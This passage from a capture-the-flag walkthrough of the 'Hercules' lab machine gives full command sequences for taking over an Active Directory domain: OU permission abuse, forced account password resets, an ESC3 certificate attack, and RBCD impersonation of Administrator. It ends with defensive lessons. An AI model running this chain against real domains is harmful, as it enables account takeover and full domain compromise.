**Learning Point:** WinRM over HTTPS (port 5986) provides encrypted remote management. The `-k` flag enables Kerberos authentication using our cached ticket, avoiding password transmission.

---

## Phase 7: Privilege Escalation to Domain Admin

This complex chain involves:
1. OU permissions manipulation
2. ESC3 certificate attack
3. Service account chain exploitation
4. Resource-Based Constrained Delegation (RBCD)

### Step 7.1: Grant Forest Migration Permissions

**Open NEW terminal (keep WinRM session open):**

```
cd ~/Downloads
export KRB5CCNAME=$(pwd)/auditor.ccache

# Grant auditor genericAll on Forest Migration OU
bloodyAD --host dc.hercules.htb -d hercules.htb -k --dc-ip 10.10.11.91 \
  add genericAll "OU=FOREST MIGRATION,OU=DCHERCULES,DC=hercules,DC=htb" auditor
```

**Learning Point:** `genericAll` is the most powerful AD permission, granting full control over an object or container. This allows auditor to modify any object within the Forest Migration OU, including enabling disabled accounts.

**⚠️ Critical:** A cleanup script runs every ~10 minutes and resets these permissions. If you encounter access denied errors later, re-run this command.

### Step 7.2: Enable fernando.r

**In WinRM session as auditor:**

```powershell
# Enable the disabled account
Enable-ADAccount -Identity fernando.r
Set-ADUser fernando.r -Enabled $true

# Set known password
Set-ADAccountPassword -Identity fernando.r `
  -NewPassword (ConvertTo-SecureString "Pwned123!" -AsPlainText -Force) -Reset

# Verify
Get-ADUser fernando.r | Select-Object Enabled
```

**Learning Point:** `fernando.r` is a member of groups with certificate enrollment rights. We'll use this account to perform an ESC3 attack.

### Step 7.3: ESC3 Certificate Attack (fernando.r → ashley.b)

**Understanding ESC3:**

ESC3 (Enrollment Agent Abuse) is a misconfiguration where:
1. A certificate template allows enrollment agent functionality
2. Another template allows specifying a subject alternative name
3. An attacker with enrollment agent cert can request certificates for ANY user

**Step A: Request Enrollment Agent Certificate**

```
# Get TGT for fernando.r
impacket-getTGT 'HERCULES.HTB/fernando.r:Pwned123!' -dc-ip 10.10.11.91
export KRB5CCNAME=$(pwd)/fernando.r.ccache

# Request Enrollment Agent certificate
certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
  -ca 'CA-HERCULES' -template 'EnrollmentAgent' -k -dc-ip 10.10.11.91

# Output: fernando.r.pfx
```

**Step B: Request Certificate on Behalf of ashley.b**

```
# ESC3 attack - impersonate ashley.b
certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
  -ca 'CA-HERCULES' -template 'UserSignature' -k -dc-ip 10.10.11.91 \
  -pfx 'fernando.r.pfx' -on-behalf-of 'hercules\ASHLEY.B' \
  -dc-host dc.hercules.htb

# If above fails with RPC error, retrieve manually:
# Request ID will be shown (e.g., 6)
certipy-ad req -u FERNANDO.R@hercules.htb -target dc.hercules.htb \
  -ca 'CA-HERCULES' -retrieve 6 -k -dc-ip 10.10.11.91

# Output: ashley.b.pfx
```

**Step C: Authenticate as ashley.b**

```
# Get TGT and NT hash from certificate
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91

# Output:
# - ashley.b.ccache
# - NT hash for ashley.b
```

**Learning Point:** ESC3 is critical because:
- Enrollment agents can request certificates for other users
- Certificate authentication bypasses password requirements
- The attack chain allows full domain compromise from a single misconfigured template

### Step 7.4: Grant IT Support Permissions

```
# Switch to auditor ticket
export KRB5CCNAME=$(pwd)/auditor.ccache

# Grant IT Support group permissions
bloodyAD -d hercules.htb -u auditor -k --host dc.hercules.htb \
  add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" "IT Support"
```

**⚠️ Re-run if cleanup script resets permissions.**

### Step 7.5: WinRM as ashley.b & Enable IIS_Administrator

```
# Connect as ashley.b
export KRB5CCNAME=$(pwd)/ashley.b.ccache
python3 winrmexec.py -ssl -port 5986 -k \
  hercules.htb/ashley.b@dc.hercules.htb -no-pass
```

**In PowerShell as ashley.b:**

```powershell
cd Desktop
./aCleanup.ps1

Enable-ADAccount -Identity IIS_Administrator
Set-ADUser IIS_Administrator -Enabled $true
Set-ADAccountPassword -Identity IIS_Administrator -NewPassword (ConvertTo-SecureString "Pwned123!" -AsPlainText -Force) -Reset

# Verify
Get-ADUser IIS_Administrator | Select-Object Enabled
```

### IIS Service Account Chain

**Back in Kali terminal:**

```
# Get IIS_Administrator TGT
impacket-getTGT 'hercules.htb/IIS_Administrator:Pwned123!' -dc-ip 10.10.11.91
export KRB5CCNAME=$(pwd)/IIS_Administrator.ccache

# Reset IIS_webserver$ password
bloodyAD --host dc.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k \
  set password "IIS_webserver$" Pwned123!

# Get NT hash for password
pypykatz crypto nt 'Pwned123!'
# Output: 58a478135a93ac3bf058a5ea0e8fdb71

# Get TGT for IIS_webserver$
impacket-getTGT 'hercules.htb/IIS_WEBSERVER$' -hashes :58a478135a93ac3bf058a5ea0e8fdb71 -dc-ip 10.10.11.91

# Export ticket (escape the $)
export KRB5CCNAME=$(pwd)/IIS_WEBSERVER\$.ccache

# Get session key
impacket-describeTicket IIS_WEBSERVER\$.ccache | grep 'Ticket Session Key'
# Copy the hex key (e.g., 8ab379fe7150...)

# Change password with session key (replace SESSION_KEY)
impacket-changepasswd -newhashes :SESSION_KEY_HERE \
  hercules.htb/IIS_WEBSERVER$:'Pwned123!'@dc.hercules.htb -k
```

### RBCD Attack - Impersonate Administrator

```
# U2U + S4U2Proxy
impacket-getST -u2u -impersonate Administrator \
  -spn "HOST/dc.hercules.htb" -k -no-pass \
  hercules.htb/IIS_WEBSERVER$ -dc-ip 10.10.11.91

# Verify ticket created
ls -lh Administrator@HOST_dc.hercules.htb@HERCULES.HTB.ccache
```

### Final Access - Domain Admin

```
# Export Administrator ticket
export KRB5CCNAME=$(pwd)/Administrator@HOST_dc.hercules.htb@HERCULES.HTB.ccache

# Connect as Administrator
python3 winrmexec.py -ssl -port 5986 -k \
  hercules.htb/administrator@dc.hercules.htb -no-pass
```

**Get root flag:**

```powershell
PS C:\Users\Administrator\Documents> cd ..\Desktop
PS C:\Users\Administrator\Desktop> dir
PS C:\Users\Administrator\Desktop> type root.txt

# If root.txt is elsewhere:
PS C:\> Get-ChildItem -Path C:\Users -Recurse -Filter root.txt -ErrorAction SilentlyContinue
```

---

## Key Lessons Learned

### 1. **LDAP Injection Prevention**
- Never rely solely on client-side validation
- Properly escape all LDAP special characters: `*`, `(`, `)`, `\`, `/`
- Use parameterized LDAP queries when possible
- Implement strict input validation with whitelists, not blacklists

### 2. **AD Description Field Security**
- Never store passwords in user description fields
- Regularly audit sensitive attributes for exposed credentials
- Implement secrets management solutions (Azure Key Vault, HashiCorp Vault)

### 3. **Certificate Services Hardening**
- Audit certificate templates for ESC vulnerabilities (ESC1-ESC8)
- Disable enrollment agent functionality if not required
- Restrict certificate enrollment to specific groups
- Implement certificate approval workflows

### 4. **Shadow Credentials Mitigation**
- Monitor changes to `msDS-KeyCredentialLink` attributes
- Restrict write permissions on user objects
- Implement Azure AD PHS (Password Hash Synchronization) protection
- Use Windows Defender for Endpoint to detect shadow credential attacks

### 5. **Service Account Security**
- Never use weak/default passwords for service accounts
- Implement gMSA (Group Managed Service Accounts) where possible
- Limit delegation capabilities (disable unconstrained/RBCD when unnecessary)
- Monitor high-privilege service accounts for anomalous behavior

### 6. **Kerberos Best Practices**
- Ensure proper DNS resolution (dc.hercules.htb before hercules.htb)
- Configure `/etc/krb5.conf` correctly for authentication
- Monitor for suspicious TGT/TGS requests
- Implement service account tiering

### 7. **WinRM Hardening**
- Require strong authentication (certificates > Kerberos > NTLM)
- Limit WinRM access to specific IPs/subnets
- Enable JEA (Just Enough Administration)
- Monitor WinRM logs for suspicious connections

---

## Attack Chain Summary

```
LDAP Injection (Web) → ken.w credentials
         ↓
Password Spray → Authenticated as ken.w
         ↓
NTLM Capture (Optional) → natalie.a credentials
         ↓
Shadow Credentials → bob.w → auditor (USER FLAG)
         ↓
OU Permissions Manipulation → fernando.r
         ↓
ESC3 Certificate Attack → ashley.b
         ↓
Service Account Chain → IIS_Administrator → IIS_WEBSERVER$
         ↓
RBCD Attack → Administrator (ROOT FLAG)
```

---

## Tools Used

- **nmap**: Port scanning
- **Python/httpx**: Custom LDAP injection scripts
- **kerbrute**: Kerberos password spraying
- **Responder**: NTLM hash capture
- **certipy-ad**: Certificate attacks and shadow credentials
- **bloodyAD**: AD permissions manipulation
- **impacket suite**: Kerberos ticket operations
- **winrmexec**: Remote PowerShell access

---

## Conclusion

Hercules demonstrates how multiple seemingly minor misconfigurations can chain together to result in full domain compromise. The attack path requires deep understanding of:
- LDAP filter syntax and injection techniques
- Active Directory permission models
- Kerberos authentication flows
- Certificate Services architecture
- Service delegation mechanisms

This machine emphasizes that **defense in depth** is critical. A single hardened component (proper LDAP input validation, disabled ESC3, restricted service account permissions) would have broken the attack chain.

**Final Statistics:**
- Time to pwn: 3-6 hours (with proper enumeration)
- Difficulty: Insane
- Required knowledge: AD internals, Kerberos, certificates, LDAP

**Congratulations on completing Hercules!**
